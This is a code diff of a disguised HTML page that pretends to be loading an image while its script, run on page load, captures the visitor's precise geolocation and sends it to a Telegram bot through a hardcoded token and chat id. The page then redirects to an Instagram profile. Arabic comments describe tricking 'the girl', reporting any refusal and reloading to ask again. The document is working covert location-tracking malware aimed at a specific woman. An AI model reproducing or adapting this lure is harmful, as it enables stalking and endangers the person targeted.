@@ -3,21 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري تحميل الصورة...</title>
+    <title>جاري فتح الصورة...</title>
     <style>
-        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #e1306c; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
+        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #e1306c; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="loader"></div>
+
 <script>
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
-    function capture() {
-        const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
+    function sendLocation() {
+        const options = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(p) {
@@ -25,22 +26,27 @@
                 const lon = p.coords.longitude;
                 const acc = p.coords.accuracy;
 
-                // هذا هو الرابط المصحح الذي سيفتح الخرائط مباشرة
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                // تنسيق الرابط لفتح تطبيق الخرائط مباشرة بدبوس
+                const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                let msg = `🎯 **تم تحديد الموقع بدقة!**\n`;
-                msg += `📍 الرابط المباشر:\n${mapLink}\n`;
-                msg += `📏 نسبة الخطأ: ${acc.toFixed(1)} متر`;
+                let text = `🎯 **تم تحديد الموقع بدقة!**\n`;
+                text += `👤 الحساب: ha2542213\n`;
+                text += `📍 الرابط (اضغط للفتح):\n${googleMaps}\n`;
+                text += `📏 نسبة الخطأ: ${acc.toFixed(1)} متر`;
 
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
                 
-                setTimeout(() => { window.location.href = "https://www.instagram.com/ha2542213"; }, 1500);
+                // تحويل البنت لبروفايلها لإنهاء الخدعة
+                setTimeout(() => { window.location.href = "https://www.instagram.com/ha2542213"; }, 1000);
+
             }, function(e) {
+                // إذا رفضت، نبلغك ونعيد المحاولة
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('⚠️ البنت رفضت إعطاء صلاحية الموقع.')}`);
                 location.reload();
-            }, geoOptions);
+            }, options);
         }
     }
-    window.onload = capture;
+    window.onload = sendLocation;
 </script>
 </body>
 </html>
